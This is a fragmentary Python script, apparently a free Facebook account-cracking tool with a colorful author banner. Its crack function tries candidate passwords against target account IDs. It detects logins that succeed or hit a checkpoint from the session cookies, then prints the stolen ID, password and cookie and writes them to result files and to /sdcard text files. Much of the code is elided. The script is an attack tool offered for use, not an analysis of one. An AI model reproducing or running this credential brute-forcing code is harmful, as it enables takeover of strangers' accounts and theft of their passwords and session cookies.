...
->[----------------------------------------------------------------]<-    
\033[1;37m×->\033[1;32mSabin-YOUR->DADDY->Is-Here\033[1;37m                                                     
\033[1;37;1m-----------------------------------------------
 \033[1;36m[•] AUTHOR -> \033[1;37m     -> \033[1;37m×->\033[1;32mSABIN-DADDY\033[1;37m
 \033[1;36m[•] GITHUB -> \033[1;37m    ->  \033[1;37m×->\033[1;32mGoleBrand\033[1;37m
 \033[1;36m[•] FACEBOOK -> \033[1;37m  -> : \033[1;37m×->\033[1;32mSabin Tamang\033[1;37m
 \033[1;36m[•]TOOL/ -> \033[1;37m   ->  \033[1;97m : \x1b[97m\033[37;41m FREE\033[0;m
 \033[1;36m[•] VERSION -> \033[1;37m   ->  \033[1;36m1.0 \033[1;37m
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[SABIN-DON] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [\033[1;37mSABIN-[🌼]-OK\033[1;32m\033[1;37m] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/SABIN_Dada-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}\033[1;36mSabin-[🤢]-CP \033[1;37m{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/SABIN_Dada[🤢]-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("SABIN")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("SABIN")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
